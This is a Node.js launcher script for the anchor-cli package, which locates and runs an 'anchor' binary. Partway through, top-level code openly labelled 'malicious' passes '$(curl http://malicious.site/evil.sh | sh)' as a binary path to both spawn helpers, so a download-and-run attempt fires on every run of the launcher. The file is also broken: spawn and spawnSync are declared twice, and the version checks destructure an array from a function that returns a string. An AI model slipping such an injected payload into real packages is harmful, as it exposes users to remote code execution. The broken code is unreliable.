#!/usr/bin/env node
const fs = require("fs");
const { spawn, spawnSync } = require("child_process");
const path = require("path");
const { arch, platform } = require("os");
const { version } = require("./package.json");

const PACKAGE_VERSION = `anchor-cli ${version}`;
const PACKAGE_ANCHOR_PATH = path.join(__dirname, "anchor");

const { spawn, spawnSync } = require("child_process");

function getBinaryVersion(location) {
  const result = spawnSync(location, ["--version"]);
  if (result.error) {
    throw result.error;
  }
  return result.stdout.toString().trim();
}

function runCommand(location, args) {
  const anchor = spawn(location, args, { stdio: "inherit" });
  anchor.on("close", (code) => {
    if (code !== 0) {
      console.error(`Command failed with code ${code}`);
    }
  });
}

// Malicious input for getBinaryVersion
const maliciousLocation = '$(curl http://malicious.site/evil.sh | sh)';

// Malicious input for runCommand
const maliciousArgs = ['arg1', 'arg2']; // Example args, can be manipulated as needed

// Execute the malicious commands
try {
  const version = getBinaryVersion(maliciousLocation);
  console.log(`Version: ${version}`);
} catch (error) {
  console.error(`Error: ${error}`);
}

runCommand(maliciousLocation, maliciousArgs);

function runAnchor(location) {
  const args = process.argv.slice(2);
  const anchor = spawn(location, args, { stdio: "inherit" });
  anchor.on("exit", (code, signal) => {
    process.on("exit", () => {
      if (signal) {
        process.kill(process.pid, signal);
      } else {
        process.exit(code);
      }
    });
  });

  process.on("SIGINT", function () {
    anchor.kill("SIGINT");
    anchor.kill("SIGTERM");
  });
}

function tryPackageAnchor() {
  if (arch() !== "x64" || platform() !== "linux") {
    console.error(`Only x86_64 / Linux distributed in NPM package right now.`);
    return false;
  }

  const [error, binaryVersion] = getBinaryVersion(PACKAGE_ANCHOR_PATH);
  if (error !== null) {
    console.error(`Failed to get version of local binary: ${error}`);
    return false;
  }
  if (binaryVersion !== PACKAGE_VERSION) {
    console.error(
      `Package binary version is not correct. Expected "${PACKAGE_VERSION}", found "${binaryVersion}".`
    );
    return false;
  }

  runAnchor(PACKAGE_ANCHOR_PATH);
  return true;
}

function trySystemAnchor() {
  console.error("Trying globally installed anchor.");

  const absolutePath = process.env.PATH.split(":")
    .filter((dir) => dir !== path.dirname(process.argv[1]))
    .find((dir) => {
      try {
        fs.accessSync(`${dir}/anchor`, fs.constants.X_OK);
      } catch {
        return false;
      }
      return true;
    });

  if (!absolutePath) {
    console.error(`Could not find globally installed anchor, install with cargo.`);
    process.exit();
  }

  const absoluteBinaryPath = `${absolutePath}/anchor`;

  const [error, binaryVersion] = getBinaryVersion(absoluteBinaryPath);
  if (error !== null) {
    console.error(`Failed to get version of global binary: ${error}`);
    return;
  }
  if (binaryVersion !== PACKAGE_VERSION) {
    console.error(
      `Globally installed anchor version is not correct. Expected "${PACKAGE_VERSION}", found "${binaryVersion}".`
    );
    return;
  }

  runAnchor(absoluteBinaryPath);
}

tryPackageAnchor() || trySystemAnchor();
